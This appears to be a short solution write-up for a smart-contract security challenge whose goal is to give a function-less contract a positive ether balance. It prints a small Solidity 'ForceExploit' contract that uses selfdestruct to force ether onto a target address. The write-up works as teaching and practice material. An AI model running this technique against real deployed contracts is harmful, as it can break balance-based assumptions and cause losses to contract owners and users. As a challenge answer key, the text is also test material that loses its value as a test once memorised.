# Answer

Goal: Make balance great again (above 0).

## 1. Transfering eth to contract

The contract is seemingly empty of any functions, but we can call selfdestruct in any outside contract to force balance on to any address:

```solidity
contract ForceExploit {

    constructor (address targetAddr) payable {
        selfdestruct(payable(targetAddr));
    }
}
```

